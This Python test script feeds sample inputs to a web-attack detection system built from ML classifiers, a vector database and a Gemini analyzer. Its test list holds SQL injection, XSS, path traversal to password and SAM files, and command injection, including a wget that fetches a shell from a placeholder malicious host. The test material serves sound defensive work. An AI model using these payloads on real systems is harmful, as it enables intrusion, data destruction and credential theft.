#!/usr/bin/env python3
"""
Test script for enhanced payload detection system.
Tests both traditional ML models and enhanced vector DB + Gemini analysis.
"""

import sys
import os
import logging
import joblib
import pandas as pd
from pathlib import Path

# Add utils to path
sys.path.append('/app/utils')
from enhanced_vectordb import EnhancedVectorDBManager
from gemini_analyzer import GeminiPayloadAnalyzer

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PayloadTester")

class PayloadTester:
    def __init__(self):
        self.models_dir = Path("/app/models")
        self.attack_model = None
        self.network_model = None
        self.vectordb_manager = None
        self.gemini_analyzer = None
        
        self.load_models()
        self.setup_enhanced_features()
    
    def load_models(self):
        """Load the trained ML models."""
        try:
            attack_model_path = self.models_dir / "attack_model.joblib"
            network_model_path = self.models_dir / "network_model.joblib"
            
            if attack_model_path.exists():
                self.attack_model = joblib.load(attack_model_path)
                logger.info("✅ Attack model loaded successfully")
            else:
                logger.warning("❌ Attack model not found")
                
            if network_model_path.exists():
                self.network_model = joblib.load(network_model_path)
                logger.info("✅ Network model loaded successfully")
            else:
                logger.warning("❌ Network model not found")
                
        except Exception as e:
            logger.error(f"Error loading models: {e}")
    
    def setup_enhanced_features(self):
        """Setup enhanced features (Vector DB and Gemini)."""
        try:
            # Setup Vector DB Manager
            self.vectordb_manager = EnhancedVectorDBManager(db_path="/app/training_vectordb")
            logger.info("✅ Vector DB Manager initialized")
            
            # Setup Gemini Analyzer
            self.gemini_analyzer = GeminiPayloadAnalyzer()
            logger.info("✅ Gemini Analyzer initialized")
            
        except Exception as e:
            logger.warning(f"Enhanced features setup failed: {e}")
    
    def test_ml_classification(self, payload: str):
        """Test payload with traditional ML models."""
        results = {}
        
        if self.attack_model:
            try:
                prediction = self.attack_model.predict([payload])[0]
                probabilities = self.attack_model.predict_proba([payload])[0]
                results['attack_model'] = {
                    'prediction': prediction,
                    'confidence': max(probabilities),
                    'probabilities': dict(zip(self.attack_model.classes_, probabilities))
                }
            except Exception as e:
                results['attack_model'] = {'error': str(e)}
        
        if self.network_model:
            try:
                prediction = self.network_model.predict([payload])[0]
                probabilities = self.network_model.predict_proba([payload])[0]
                results['network_model'] = {
                    'prediction': prediction,
                    'confidence': max(probabilities),
                    'probabilities': dict(zip(self.network_model.classes_, probabilities))
                }
            except Exception as e:
                results['network_model'] = {'error': str(e)}
        
        return results
    
    def test_vector_similarity(self, payload: str, top_k: int = 5):
        """Test payload against vector database for similar patterns."""
        if not self.vectordb_manager:
            return {'error': 'Vector DB not available'}
        
        try:
            similar_payloads = self.vectordb_manager.retrieve_similar_payloads(
                query_payload=payload,
                top_k=top_k,
                include_analysis=True
            )
            
            return {
                'similar_count': len(similar_payloads),
                'top_matches': similar_payloads[:3],  # Show top 3
                'malicious_matches': sum(1 for p in similar_payloads if p.get('is_malicious', False)),
                'legitimate_matches': sum(1 for p in similar_payloads if not p.get('is_malicious', True))
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_gemini_analysis(self, payload: str):
        """Test payload with Gemini analysis."""
        if not self.gemini_analyzer:
            return {'error': 'Gemini not available'}
        
        try:
            analysis = self.gemini_analyzer.analyze_payload_batch([payload], max_batch_size=1)
            if analysis:
                return analysis[0]
            else:
                return {'error': 'No analysis returned'}
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_test(self, payload: str):
        """Run comprehensive test on payload using all available methods."""
        print(f"\n{'='*80}")
        print(f"🔍 COMPREHENSIVE PAYLOAD ANALYSIS")
        print(f"{'='*80}")
        print(f"📝 Payload: {payload[:100]}{'...' if len(payload) > 100 else ''}")
        print(f"📏 Length: {len(payload)} characters")
        
        # Traditional ML Classification
        print(f"\n🤖 TRADITIONAL ML MODELS:")
        ml_results = self.test_ml_classification(payload)
        for model_name, result in ml_results.items():
            if 'error' in result:
                print(f"   ❌ {model_name}: {result['error']}")
            else:
                print(f"   ✅ {model_name}: {result['prediction']} (confidence: {result['confidence']:.3f})")
                for class_name, prob in result['probabilities'].items():
                    print(f"      • {class_name}: {prob:.3f}")
        
        # Vector Similarity Search
        print(f"\n🔍 VECTOR SIMILARITY ANALYSIS:")
        vector_results = self.test_vector_similarity(payload)
        if 'error' in vector_results:
            print(f"   ❌ Vector DB: {vector_results['error']}")
        else:
            print(f"   ✅ Found {vector_results['similar_count']} similar payloads")
            print(f"   📊 Malicious matches: {vector_results['malicious_matches']}")
            print(f"   📊 Legitimate matches: {vector_results['legitimate_matches']}")
            
            if vector_results['top_matches']:
                print(f"   🎯 Top similar payloads:")
                for i, match in enumerate(vector_results['top_matches'], 1):
                    label = match.get('label', 'Unknown')
                    score = match.get('score', 0)
                    print(f"      {i}. {label} (similarity: {score:.3f})")
        
        # Gemini AI Analysis
        print(f"\n🤖 GEMINI AI ANALYSIS:")
        gemini_results = self.test_gemini_analysis(payload)
        if 'error' in gemini_results:
            print(f"   ❌ Gemini: {gemini_results['error']}")
        else:
            print(f"   ✅ Classification: {gemini_results.get('classification', 'Unknown')}")
            print(f"   🔍 Pattern Type: {gemini_results.get('pattern_type', 'Unknown')}")
            print(f"   ⚠️  Risk Level: {gemini_results.get('risk_level', 'Unknown')}")
            print(f"   💡 Intent: {gemini_results.get('intent', 'Unknown')}")
            print(f"   🔧 Characteristics: {gemini_results.get('characteristics', 'Unknown')}")
            insights = gemini_results.get('security_insights', 'None')
            if len(insights) > 100:
                insights = insights[:100] + "..."
            print(f"   🛡️  Security Insights: {insights}")
        
        return {
            'ml_models': ml_results,
            'vector_similarity': vector_results,
            'gemini_analysis': gemini_results
        }

def main():
    """Main testing function."""
    print("🚀 ENHANCED PAYLOAD DETECTION SYSTEM TEST")
    print("="*80)
    
    # Initialize tester
    tester = PayloadTester()
    
    # Test payloads
    test_payloads = [
        # Legitimate payloads
        "user=john&password=mypassword123",
        "search=python tutorial",
        "GET /api/users?page=1&limit=10",
        
        # SQL Injection
        "1' OR '1'='1",
        "admin'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        
        # XSS
        "<script>alert('XSS')</script>",
        "javascript:alert(document.cookie)",
        "<img src=x onerror=alert('XSS')>",
        
        # Command Injection
        "; ls -la",
        "| cat /etc/passwd",
        "&& wget http://malicious.com/shell.php",
        
        # Path Traversal
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd"
    ]
    
    # Run tests
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n📋 TEST {i}/{len(test_payloads)}")
        results = tester.comprehensive_test(payload)
    
    print(f"\n{'='*80}")
    print("✅ ALL TESTS COMPLETED!")
    print("🎯 The enhanced system combines traditional ML, vector similarity, and AI analysis")
    print("🛡️  This provides comprehensive threat detection across all 440k+ training patterns")
    print("="*80)

if __name__ == "__main__":
    main()